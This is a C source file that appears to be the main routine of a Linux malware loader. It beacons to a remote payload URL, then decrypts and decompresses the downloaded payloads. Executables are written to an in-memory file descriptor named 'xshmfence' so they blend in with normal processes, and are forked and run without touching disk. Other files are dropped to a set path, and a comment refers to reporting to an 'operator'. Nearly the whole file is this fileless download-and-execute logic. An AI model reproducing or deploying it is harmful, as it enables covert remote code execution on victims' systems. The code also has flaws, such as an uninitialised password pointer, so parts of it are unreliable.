#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include "detect.h"
#include "helpers.h"
#include "networking.h"
#include "preferences.h"

int main(int argc, char **argv)
{
    struct MemoryStruct payload;
    void *decrypted;
    void *decompressed;
    PayloadStruct *payloadMeta; // holds the sizes of each payload
    unsigned char *payloadOffset; // hold offset from payload base addr for addressing
    unsigned int numPayloads;
    int payloadFD;       // in memory file descriptor
    int writeReturnSize;
    int d;                               //to hold the return value of detect()
    pid_t child;
    unsigned char *psswd;
    int numFiles = 0;
    char currFileName[strlen(PATH_TO_WRITE) + 5];

    payload = beacon(PAYLOAD_URL);
    payloadOffset = payload.memory; // hold for iteration
    numPayloads = extractInt(payloadOffset);

    payloadMeta = parseMeta(&payloadOffset); // extract all metadata
    if(payloadMeta == NULL){
        //free everything
        return -1;
    }


    // password padding
    psswd = psswdPadding(psswd);
    if (psswd == NULL)
    {
        free(payload.memory);
        free(payloadMeta);
        return -1;
    }

    for (int i = 0; i < numPayloads; i++)
    { // main loop to deploy payloads

        decrypted = (void *)decrypt((unsigned char *)payloadOffset, payloadMeta[i].encryptedLength, payloadMeta[i].decryptedLength, psswd);
        if (decrypted == NULL)
        {
            free(decrypted);
            free(payload.memory);
            free(payloadMeta);
            return -1;
        }

        decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)payloadMeta[i].uncompressedLength, (uLong)payloadMeta[i].decryptedLength);

        while ((payloadFD = memfd_create("xshmfence", 0)) <= 2) // name as such due to this fd name appearing often on linux
        {                                                       // create memory file descriptor for execution
            close(payloadFD);
            return -1;
        }

        writeReturnSize = write(payloadFD, decompressed, payloadMeta[i].uncompressedLength); // write to mem_fd and error check
        if (writeReturnSize != payloadMeta[i].uncompressedLength)
        {
            free(decompressed);
            free(payload.memory);
            free(payloadMeta);
            free(psswd);
            close(payloadFD);
            return -1;
        }

        d = detect((unsigned char *)decompressed); //determine if the payload is an executable/ELF

        if (d == 1)
        {
            if ((child = fork()) == 0)
            {
                if (executePayload(payloadFD, payloadMeta[i].argv, payloadMeta[i].envp) == 0) // execute within child
                {
                    //send message to operator
                    free(decompressed);
                    free(payload.memory);
                    free(payloadMeta);
                    free(psswd);
                    close(payloadFD);
                    return -1;
                }
            }
            else
            {
                wait(&child); // wait for child to finish within parent
            }
        }
        else
        {
            sprintf(currFileName, "%s%d", PATH_TO_WRITE, numFiles);
            writeToDisk(decompressed, currFileName, payloadMeta[i].uncompressedLength);
            numFiles++;
        }
        free(decompressed);
        payloadOffset += payloadMeta[i].encryptedLength; // increment offset to point at next payload
    }
    free(payload.memory);
    free(payloadMeta);
    free(psswd);
    return 0;
}